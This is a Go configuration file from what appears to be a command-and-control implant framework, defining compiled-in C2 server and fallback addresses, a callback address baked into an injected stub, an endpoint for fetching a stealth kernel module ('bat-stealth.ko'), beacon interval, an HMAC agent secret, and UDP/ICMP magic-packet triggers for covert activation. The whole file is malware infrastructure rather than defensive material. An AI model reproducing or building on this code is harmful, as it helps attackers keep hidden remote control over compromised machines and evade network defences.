package config

// DefaultServer is the compiled-in C2 server address (host:port).
// Injected at build time with:
//
//	go build -ldflags "-X 'core/mon/internal/config.DefaultServer=IP:PORT'"
//
// Or via the Makefile:
//
//	make SERVER=1.2.3.4:8443 all
//
// Falls back to requiring --server flag if empty.
var DefaultServer = ""

// FallbackServer is the compiled-in fallback C2 address (host:port).
// Tried when DefaultServer is unreachable — typically the relay's direct IPv4:port,
// bypassing Cloudflare CDN if the domain is unavailable.
// Injected at build time:
//
//	make SERVER=cdn.example.com:443 FALLBACK=1.2.3.4:443 all
var FallbackServer = ""

// RawsockCBAddr is the compiled-in rawsock callback address (IPv4:port).
// Baked into the injected stub so the rawsock thread always connects here on trigger,
// regardless of who sent the magic packet (I-01 model: server local).
// Must be directly reachable from the target (relay public IP:9443 via SSH tunnel).
//
// If empty at runtime, falls back to FallbackServer host + port 9443.
// Injected at build time:
//
//	make ... RAWSOCK_CB=1.2.3.4:9443 all
var RawsockCBAddr = ""

// KCCAddr is the compiled-in KCC HTTPS endpoint (host:port) for direct agent access.
// Used by the K-series goroutine to request bat-stealth.ko without going through the server.
// If empty, derived automatically from FallbackServer host + ":9444".
// Injected at build time:
//
//	make ... KCC_ADDR=1.2.3.4:9444 all
var KCCAddr = ""

// DefaultInterval is the compiled-in beacon interval.
var DefaultInterval = "30s"

// SharedSecret is the compiled-in HMAC key for agent authentication.
// Injected at build time with:
//
//	go build -ldflags "-X 'core/mon/internal/config.SharedSecret=HEXKEY'"
//
// Or via the Makefile:
//
//	make SECRET=deadbeefcafe all
//
// Server drops any check-in whose token does not validate against this secret.
var SharedSecret = ""

// TriggerMode controls how the agent listens for out-of-band activation.
// Values:
//
//	"udp"  — listens for UDP magic packet on port 54321 (default, lab + CDN profiles)
//	"icmp" — listens for ICMP echo with magic payload (singularity profile, no port needed)
//	"both" — listens for both UDP and ICMP simultaneously
//
// Injected at build time:
//
//	make TRIGGER=icmp all
var TriggerMode = "udp"
